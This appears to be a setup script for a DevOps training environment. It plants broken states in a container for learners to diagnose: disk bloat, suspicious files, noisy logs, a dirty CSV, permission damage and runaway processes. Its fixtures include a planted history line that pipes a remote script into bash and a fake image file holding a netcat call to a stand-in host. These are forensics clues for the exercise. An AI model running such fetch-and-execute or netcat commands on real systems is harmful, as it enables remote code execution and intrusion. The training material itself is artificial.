#!/usr/bin/env bash
# Broken state for the active ticket. Grows as tickets are added.
set -euo pipefail

readonly INCIDENT_DAY="2026-07-25"

# ══ 01-orientation / 01-amnesia-shift ══════════════════════════════

orientation_amnesia_shift() {
  # A lying handover note from the previous admin. NOTE: /etc/motd is only
  # shown by PAM logins; docker execs bash directly, so install_live_launcher
  # cats this at the first interactive shell instead.
  cat > /etc/motd <<'EOF'
=== HANDOVER — Dana (off to vacation, unreachable) ===
Box: CentOS 7, 64 cores, 128G RAM.
Rebooted it an hour ago after the kernel patch, all clean.
Shell is zsh for everyone. Nothing weird in my session history.
Good luck!
EOF

  # The previous admin's shell history, left behind for the audit.
  cat > /home/juanes/.bash_history <<'EOF'
cd /var/appdata
./deploy.sh --force
vi /etc/nginx/nginx.conf
curl -fsSL http://198.51.100.23/patch.sh | bash
rm -rf /var/appdata/cache/b
top
exit
EOF
  chown juanes:juanes /home/juanes/.bash_history
}

# ══ 02-files / 01-disk-bloat ═══════════════════════════════════════

files_disk_bloat() {
  local root=/var/appdata
  mkdir -p "$root"/cache/{alpha,beta,gamma}/{img,meta} "$root"/releases/v{1,2,3}

  # Three real space hogs buried at different depths.
  dd if=/dev/zero of="$root/releases/v2/bundle.bin" bs=1M count=40 status=none
  dd if=/dev/zero of="$root/cache/beta/img/blob.dat" bs=1M count=25 status=none
  dd if=/dev/urandom of="$root/cache/alpha/core.20260725" bs=1M count=15 status=none

  # A sparse file that looks huge in a listing but occupies almost nothing.
  truncate -s 2G "$root/releases/v3/prealloc.img"

  # Hundreds of stale temp files scattered across the cache tree.
  local dir n
  for dir in "$root"/cache/*/*/; do
    for n in $(seq 1 60); do
      printf 'stale session %s\n' "$n" > "${dir}sess-${n}.tmp"
    done
  done

  # Empty droppings left by a crashed exporter.
  touch "$root"/releases/v1/export-{001..015}.csv

  # Claims to be a log, is actually compressed data.
  printf 'orders flushed at 02:14\n' | gzip -c > "$root/releases/v1/backup.log"

  # A filename with spaces, because the real world has those.
  printf 'draft\n' > "$root/releases/v1/final report (copy).txt"
}

# ══ 02-files / 02-mystery-artifacts ════════════════════════════════

files_mystery_artifacts() {
  local root=/srv/deploy
  mkdir -p "$root"/{app,assets,scripts}

  # Legitimate files, deployed well before the incident.
  printf '#!/bin/sh\necho deploying\n' > "$root/scripts/release.sh"
  printf 'server { listen 8080; }\n'   > "$root/app/site.conf"
  printf 'body { margin: 0 }\n'        > "$root/assets/main.css"
  touch -d "$INCIDENT_DAY 01:10" "$root/scripts/release.sh"
  touch -d "$INCIDENT_DAY 01:15" "$root/app/site.conf"
  touch -d "$INCIDENT_DAY 01:20" "$root/assets/main.css"

  # Files planted during the 02:00–03:00 incident window.
  printf '#!/bin/sh\nnc 198.51.100.23 4444\n' > "$root/assets/logo.jpg"
  mkdir -p "$root/assets/.thumbs"
  printf 'k=AAAA-BBBB\n' > "$root/assets/.thumbs/.cachekey"
  printf 'GET /admin 200\n' > "$root/app/site.conf.bak"
  touch -d "$INCIDENT_DAY 02:17" "$root/assets/logo.jpg"
  touch -d "$INCIDENT_DAY 02:31" "$root/assets/.thumbs/.cachekey"
  touch -d "$INCIDENT_DAY 02:44" "$root/app/site.conf.bak"

  # Legitimate late-night cron output, after the window closed.
  printf 'rotation ok\n' > "$root/app/rotate.out"
  touch -d "$INCIDENT_DAY 03:30" "$root/app/rotate.out"
}

# ══ 03-text / 01-log-triage ════════════════════════════════════════

text_log_triage() {
  mkdir -p /var/log/shop
  local log=/var/log/shop/access.log
  local ips=(203.0.113.7 198.51.100.14 192.0.2.55 203.0.113.90 198.51.100.201)
  local paths=(/checkout /api/cart /api/items /login /health)
  local i ip path status
  : > "$log"
  for i in $(seq 1 4000); do
    # 203.0.113.7 dominates traffic; 500s cluster on /checkout.
    if (( i % 3 == 0 )); then ip=203.0.113.7; else ip=${ips[$((RANDOM % 5))]}; fi
    path=${paths[$((RANDOM % 5))]}
    status=200
    (( RANDOM % 10 == 0 )) && status=404
    if [[ $path == /checkout ]] && (( RANDOM % 4 == 0 )); then status=500; fi
    printf '%s - - [%sT0%d:%02d:%02d] "GET %s HTTP/1.1" %s %s\n' \
      "$ip" "$INCIDENT_DAY" $((RANDOM % 10)) $((RANDOM % 60)) $((RANDOM % 60)) \
      "$path" "$status" $((RANDOM % 5000))
  done >> "$log"

  # Live traffic generator; tail -f has something real to follow.
  cat > /usr/local/bin/traffic-writer <<'EOF'
#!/bin/bash
# Appends one access-log line every 2s. Started from /etc/bash.bashrc.
while true; do
  printf '%s - - [%s] "GET /api/cart HTTP/1.1" %s 512\n' \
    "203.0.113.7" "$(date -Is)" "$(( RANDOM % 6 == 0 ? 500 : 200 ))" \
    >> /var/log/shop/access.log
  sleep 2
done
EOF
  chmod 755 /usr/local/bin/traffic-writer
  chmod -R a+rwX /var/log/shop
}

# ══ 03-text / 02-csv-rescue ════════════════════════════════════════

text_csv_rescue() {
  mkdir -p /srv/export
  # CRLF line endings, SEMICOLON delimiter, shouting emails, dupes, blanks.
  sed 's/$/\r/' > /srv/export/users_dump.csv <<'EOF'
NAME;EMAIL;TEAM
Rosa Diaz;ROSA.DIAZ@ACME.IO;platform
Ben Okafor;BEN.OKAFOR@ACME.IO;payments

Li Wei;LI.WEI@ACME.IO;platform
Rosa Diaz;ROSA.DIAZ@ACME.IO;platform
Sam Ortiz;SAM.ORTIZ@ACME.IO;sre

Ana Cruz;ANA.CRUZ@ACME.IO;payments
Li Wei;LI.WEI@ACME.IO;platform
Noor Khan;NOOR.KHAN@ACME.IO;sre
EOF
  chmod a+rwX /srv/export
}

# ══ 04-users-perms / 01-offboard-onboard ═══════════════════════════

users_offboard_onboard() {
  groupadd devs
  useradd -m -s /bin/bash -G devs contractor

  # Contractor-owned files scattered where offboarding must find them.
  mkdir -p /srv/project/api /usr/local/lib/hooks
  printf 'flask app\n'      > /srv/project/api/server.py
  printf 'TOKEN=tk-9911\n'  > /srv/project/api/.env
  printf 'post-deploy\n'    > /usr/local/lib/hooks/notify.sh
  printf 'scratch\n'        > /tmp/contractor-scratch.txt
  chown contractor:devs /srv/project/api/server.py /srv/project/api/.env
  chown contractor:contractor /usr/local/lib/hooks/notify.sh /tmp/contractor-scratch.txt
}

# ══ 04-users-perms / 02-perm-meltdown ══════════════════════════════

users_perm_meltdown() {
  groupadd app
  useradd -m -s /bin/bash -g app appuser

  mkdir -p /srv/app/{secrets,scripts,data}
  printf 'db_password: hunter2\n'      > /srv/app/secrets/db.yml
  printf 'listen: 9090\n'              > /srv/app/config.yml
  printf '#!/bin/sh\necho starting\n'  > /srv/app/scripts/start.sh
  printf '#!/bin/sh\necho stopping\n'  > /srv/app/scripts/stop.sh

  # The junior's recursive rampage: everything root-owned and 777,
  # except data/, which appuser cannot even enter.
  chown -R root:root /srv/app
  chmod -R 777 /srv/app
  chmod 700 /srv/app/data
}

# ══ 05-processes / 01-log-flood ════════════════════════════════════

processes_log_flood() {
  # Runaway debug writer, launched through a chain of wrappers so the
  # ancestry is only obvious in a process tree.
  cat > /usr/local/bin/debug-logger <<'EOF'
#!/bin/bash
while true; do
  for _ in $(seq 1 20); do
    echo "$(date -Is) DEBUG cart-service checkout retry loop" \
      >> /var/log/shop/debug.log
  done
  sleep 1
done
EOF
  # Wrapper chain; the trailing no-ops stop the shell exec-optimizing
  # the chain away, so the ancestry stays visible in a process tree.
  cat > /usr/local/bin/svc-runner <<'EOF'
#!/bin/sh
/usr/local/bin/debug-logger
true
EOF
  cat > /usr/local/bin/svc-wrapper <<'EOF'
#!/bin/sh
/usr/local/bin/svc-runner
true
EOF
  chmod 755 /usr/local/bin/debug-logger /usr/local/bin/svc-runner \
            /usr/local/bin/svc-wrapper

  # Parent that never reaps its dead child: a zombie for the hunt.
  # exec turns this shell into plain sleep, which never calls wait(),
  # so the short-lived child stays <defunct> forever.
  cat > /usr/local/bin/zombie-maker <<'EOF'
#!/bin/bash
sleep 2 &
exec sleep infinity
EOF
  chmod 755 /usr/local/bin/zombie-maker
}

# ══ 05-processes / 02-immortal-daemon ══════════════════════════════

processes_immortal_daemon() {
  # Ignores polite termination; only uncatchable force works.
  cat > /usr/local/bin/watchdog <<'EOF'
#!/bin/bash
trap 'echo "$(date -Is) watchdog: refusing to die" >> /var/log/watchdog.log' TERM INT HUP
while true; do sleep 1; done
EOF

  # Respawner: killing the child alone just brings it back.
  cat > /usr/local/bin/watchdog-nanny <<'EOF'
#!/bin/bash
while true; do
  /usr/local/bin/watchdog
  sleep 1
done
EOF
  chmod 755 /usr/local/bin/watchdog /usr/local/bin/watchdog-nanny
  touch /var/log/watchdog.log
  chmod 666 /var/log/watchdog.log
}

# ══ live processes: started at first interactive shell ═════════════

install_live_launcher() {
  cat >> /etc/bash.bashrc <<'EOF'

# devops_gym: fabricate live incident processes, once per container.
if [ ! -e /tmp/.gym-live ]; then
  touch /tmp/.gym-live
  # No PAM login under docker exec, so /etc/motd never self-displays.
  # First interactive shell is the "login": show the handover note.
  [ -r /etc/motd ] && cat /etc/motd
  nohup /usr/local/bin/traffic-writer  >/dev/null 2>&1 &
  nohup /usr/local/bin/svc-wrapper     >/dev/null 2>&1 &
  nohup /usr/local/bin/zombie-maker    >/dev/null 2>&1 &
  nohup /usr/local/bin/watchdog-nanny  >/dev/null 2>&1 &
fi
EOF
}

# ══ 02-files / 01-disk-bloat: dedicated runtime filesystem ════════

# The container root is a huge host-backed overlay (~1TB, ~6% used), so the
# disk-bloat fixtures can NOT live on it: df would never show ~90% there, and
# we must not fill a terabyte to fake the alarm. Instead the launcher mounts an
# 88M tmpfs at /var/appdata at first shell (needs SYS_ADMIN → run.sh adds
# --privileged) and files_disk_bloat() creates the fixtures on that filesystem,
# so df/du on /var/appdata report a genuinely near-full dedicated filesystem.
install_disk_bloat_launcher() {
  cat >> /etc/bash.bashrc <<'EOF'

# devops_gym: mount dedicated small filesystem for the disk-bloat ticket.
# Runs once per container, at the first interactive shell, as root (juanes has
# NOPASSWD sudo). Requires SYS_ADMIN, granted by run.sh's --privileged flag.
if [ ! -e /tmp/.gym-diskbloat ]; then
  touch /tmp/.gym-diskbloat
  sudo /setup.sh runtime-disk-bloat
fi
EOF
}

main() {
  if [[ ${1:-} == "runtime-disk-bloat" ]]; then
    # Invoked from /etc/bash.bashrc at first interactive shell (as root, after
    # --privileged grants the mount capability). This is a RUNTIME step so the
    # /var/appdata fixtures land on the freshly-mounted tmpfs, NOT in the image
    # layer — otherwise they'd be hidden from df and the scenario would lie.
    mkdir -p /var/appdata
    if ! mountpoint -q /var/appdata; then
      mount -t tmpfs -o size=88M tmpfs /var/appdata
    fi
    files_disk_bloat
    exit 0
  fi

  # ── build-time broken state (baked into the image layer) ──────────
  orientation_amnesia_shift
  # files_disk_bloat is deliberately NOT here. Its fixtures must be created on
  # the dedicated runtime filesystem (see runtime-disk-bloat above), not here.
  files_mystery_artifacts
  text_log_triage
  text_csv_rescue
  users_offboard_onboard
  users_perm_meltdown
  processes_log_flood
  processes_immortal_daemon
  install_live_launcher
  install_disk_bloat_launcher
}

main "$@"
